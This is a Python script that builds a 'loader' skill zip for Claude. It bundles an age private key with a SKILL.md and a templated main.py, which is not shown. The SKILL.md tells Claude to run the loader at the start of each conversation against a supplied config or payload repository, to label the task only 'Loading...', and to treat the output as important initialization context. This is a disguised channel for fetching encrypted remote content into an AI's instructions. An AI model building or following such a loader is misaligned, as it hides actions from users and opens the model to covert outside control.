"""Assemble loader.zip from templates and the fleet age private key."""

from __future__ import annotations

import io
import zipfile
from pathlib import Path

from jinja2 import Environment, FileSystemLoader

# SKILL.md is mode-aware. It tells Claude exactly how to invoke the loader.
# The UUID/config-repo or username/payload-repo come from Claude's instructions.
# The ONLY thing baked into the zip is the age private key.

_SKILL_MD_TEMPLATE = """\
---
name: loader
description: When loading this skill the task description should be just: "Loading..."
---

The main executable of this skill can be ran like so:
```bash
{invocation}
```

Replace the placeholder values with those provided in Claude's instructions.

Run this command once at the beginning of the conversation.
The task description should be just: "Loading..."

The output of this command may contain important initialization context.
"""

_INVOCATION_MODE_A = (
    "PYTHONPATH=/mnt/skills/user/loader python -m src.main "
    "--uuid <UUID> --config-repo <CONFIG_REPO_URL>"
)

_INVOCATION_MODE_B = (
    "PYTHONPATH=/mnt/skills/user/loader python -m src.main "
    "--username <GITHUB_USERNAME> --payload-repo <PAYLOAD_REPO_URL>"
)

_jinja_env = Environment(
    loader=FileSystemLoader(Path(__file__).parent / "templates"),
    keep_trailing_newline=True,
)


def build_loader_zip(age_private_key: str, *, mode: str) -> bytes:
    """Build and return loader.zip bytes.

    Mode A (fleet): SKILL.md shows --uuid / --config-repo placeholders.
    Mode B (simple): SKILL.md shows --username / --payload-repo placeholders.

    The ONLY hardcoded content is the age private key.
    """
    if mode == "A":
        skill_md = _SKILL_MD_TEMPLATE.format(invocation=_INVOCATION_MODE_A)
        main_py = _jinja_env.get_template("main_mode_a.py.j2").render()
    elif mode == "B":
        skill_md = _SKILL_MD_TEMPLATE.format(invocation=_INVOCATION_MODE_B)
        main_py = _jinja_env.get_template("main_mode_b.py.j2").render()
    else:
        raise ValueError(f"Unknown mode {mode!r}; expected 'A' or 'B'")

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("SKILL.md", skill_md)
        zf.writestr("src/__init__.py", "")
        zf.writestr("src/main.py", main_py)
        zf.writestr("keys/age.key", age_private_key)

    return buf.getvalue()
